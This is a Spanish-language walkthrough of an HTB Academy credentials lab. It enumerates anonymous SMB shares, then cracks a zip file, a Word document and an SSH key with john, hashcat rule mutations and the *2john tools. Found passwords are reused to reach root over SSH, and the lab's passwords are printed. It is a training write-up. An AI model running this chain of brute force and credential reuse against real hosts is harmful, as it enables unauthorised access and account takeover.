# Resolution lab2 - Credentials HTB `Academy`

## Enunciado
Our next host is a workstation used by an employee for their day-to-day work. These types of hosts are often used to exchange files with other employees and are typically administered by administrators over the network. During a meeting with the client, we were informed that many internal users use this host as a jump host. The focus is on securing and protecting files containing sensitive information.

## Solución
- Encontramos puertos 22,139,445 abiertos
- Podemos listar los recuros compartidos `SMB`:
	```bash
	crackmapexec smb $target --shares -u '' -p ''
	```

	Encontrando una carpeta `SHAREDRIVE`
- Accedemos al contenido de esta carpeta: 
	```bash
	smbclient //$target/SHAREDRIVE -N 
	```

	Encontrando un arhivo llamado `Docs.zip`

- El archivo `Docs.zip` está protegido por contraseña, por lo que aplicamos fuerza bruta con el diccionario que nos proporcionan con mutaciones
	```
	hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
	zip2john Docs.zip > docs.hash
 	john --wordlist=mut_password.list docs.hash
	```
	Encontrando pass: `Destiny2022!`
- El archivo contiene un Docx que está protegido por contraseña nuevamente, por lo que volvemos a aplicar fuerza bruta
	```bash
	locate *2john* | grep office
	office2john Documentation.docx > ../bruteforce/hashDoc
	john --wordlist=mut_password.list hashDoc
	```

	Encontrando como contraseña: `987654321`

- En el documento aparecen la siguiente información: 
	
	Root password is `jason:C4mNKjAtL2dydsYa6`

- Nos conectamos por ssh con la información obtenida

- Encontramos en mysql un archivo con varias credenciales, una de ellas coincide con el nombre de un usuario del sistema, `dennis`, cuya pass es `7AUgWWQEiMPdqx`

- Tras conectarnos como este usuario, encontramos un archivo `id_rsa` en el directorio de dennis, lo descargamos y tras intentar conectarnos como root por ssh vemos que está protegido por contraseña, por lo que craqueamos este archivo nuevamente
	```bash
	ssh2john id_rsa > ssh.hash
 	john --wordlist=mut_password.list ssh.hash
	```

	encontrando la pass `P@ssw0rd12020!`

- Nos conectamos vía ssh como usuario root con el archivo `id_rsa`, esta vez introduciendo la contraseña obtenida
